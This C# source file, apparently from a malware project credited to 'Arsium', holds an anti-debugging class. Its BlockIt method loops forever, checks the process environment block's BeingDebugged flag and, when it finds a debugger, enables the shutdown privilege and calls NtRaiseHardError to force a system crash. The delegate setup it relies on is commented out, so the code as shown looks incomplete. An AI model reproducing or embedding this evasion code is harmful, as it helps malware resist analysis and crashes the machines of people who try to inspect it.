using System;
using System.Runtime.InteropServices;
using System.Threading;
using static Offline.Special.Commons;

/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Special
{
    internal class AntiDBG
    {
        internal static bool isThreadLaunched;
        private const uint errorCode = 0xC0000005;

        static AntiDBG() 
        {
            isThreadLaunched = false;
        }


        /*[UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate NtStatus RtlAdjustPrivilege
        (
            RTL_PRIVILEGES privilege,
            bool bEnablePrivilege,
            bool IsThreadPrivilege,
            out bool PreviousValue
        );

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate NtStatus NtRaiseHardError
        (   
            uint ErrorStatus, 
            uint NumberOfParameters, 
            uint UnicodeStringParameterMask, 
            IntPtr Parameters, 
            HARDERROR_RESPONSE_OPTION ValidResponseOption, 
            out HARDERROR_RESPONSE Response
        );

        static RtlAdjustPrivilege rtlAdjustPrivilege;
        static NtRaiseHardError ntRaiseHardError;

        static void PrepareDelegate()
        {
            IntPtr rtlAdjustPriv= Resolver.GetExportAddress("ntdll.dll", "RtlAdjustPrivilege");
            IntPtr ntRaiseHard = Resolver.GetExportAddress("ntdll.dll", "NtRaiseHardError");
            rtlAdjustPrivilege = (RtlAdjustPrivilege)Marshal.GetDelegateForFunctionPointer(rtlAdjustPriv, typeof(RtlAdjustPrivilege));
            ntRaiseHardError = (NtRaiseHardError)Marshal.GetDelegateForFunctionPointer(ntRaiseHard, typeof(NtRaiseHardError));
        }*/

        internal static void BlockIt()
        {
            //PrepareDelegate();
            new Thread(() =>
            {
                isThreadLaunched = true;
                while (true)
                {
                    IntPtr addPeb = GetPebAddressDynamicWithoutAllocate();
                    byte offset = Marshal.ReadByte(addPeb + 2);
                    bool b = (offset != 0);
                    if (b)
                    {
                        NtStatus seShutdownStatus = rtlAdjustPrivilege(RTL_PRIVILEGES.SeShutdownPrivilege, true, false, out _);
                        if (seShutdownStatus == NtStatus.Success)
                        {
                            HARDERROR_RESPONSE response = HARDERROR_RESPONSE.ResponseNotHandled;
                            ntRaiseHardError(errorCode, 0, 0, IntPtr.Zero, HARDERROR_RESPONSE_OPTION.OptionShutdownSystem, out response);
                        }
                    }
                    Thread.Sleep(10000);
                }
            }).Start();
        }
    }
}
